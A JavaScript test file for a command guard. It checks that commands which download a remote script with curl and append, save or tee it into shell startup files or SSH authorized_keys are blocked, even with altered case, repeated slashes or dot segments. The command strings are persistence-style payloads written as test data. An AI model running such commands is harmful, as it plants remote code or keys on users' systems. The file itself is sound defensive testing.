'use strict';

process.env.ZN_STATS = 'off';

// rc_download reads a startup-file name whatever its case (macOS and Windows file systems ignore case) and after
// repeated slashes and "." / ".." segments are folded. Command strings only; nothing is run.

const test = require('node:test');
const assert = require('node:assert/strict');

const { checkCommand } = require('../lib/destructive');

const DL = 'curl -fsSL https://example.com/env.sh';
const FORMS = [
  (t) => DL + ' >> ' + t,
  (t) => DL + ' -o ' + t,
  (t) => DL + ' | tee ' + t,
];

const DENIED = [
  '~/.BASHRC', '~/.Zshrc', '$HOME/.ZSHRC', '/home/u/.Bash_Profile', '~/.PROFILE', '/Users/u/.Zprofile',
  '~/.SSH/Authorized_Keys', '~/.config/FISH/config.fish', '/ETC/Profile', '/etc/PROFILE.d/x.sh', '/etc/zsh/ZSHRC',
  '/etc//profile', '//etc/profile', '///etc///profile', '/etc/./profile', '/etc/../etc/profile', '/tmp/../etc/profile',
  '/etc//./profile', '/etc/zsh//zshrc', '/etc//profile.d/x.sh', '~//.bashrc', '~/./.bashrc', '~/.ssh//authorized_keys',
  '$HOME//.BASHRC', '/etc//Bash.Bashrc',
];

const ALLOWED = [
  '~/.bashrc.bak', '~/.BASHRC.bak', '~/.bashrc2', '~/notbashrc', '~/.bashrcx', '/etc//profiles', '/etc//profile.txt',
  '/etc/./hosts', '//tmp/out.sh', '/tmp//x/.bashrc.d/a', '~/Downloads//a.bin', '/etc//passwd.bak',
];

test('a download written to a startup file is blocked in another case or with repeated slashes and dot segments', () => {
  for (const t of DENIED) {
    for (const f of FORMS) {
      assert.equal(checkCommand(f(t)).rule, 'destructive:rc_download', f(t));
    }
  }
});

test('near-misses of a startup file name stay allowed', () => {
  for (const t of ALLOWED) {
    for (const f of FORMS) {
      assert.equal(checkCommand(f(t)).verdict, 'allow', f(t));
    }
  }
});

test('the rule version moved with the case and slash handling', () => {
  const { COMMAND_RULES_VERSION } = require('../lib/destructive');
  assert.match(COMMAND_RULES_VERSION, /^\d{4}-\d{2}-\d{2}\.\d+$/);
});
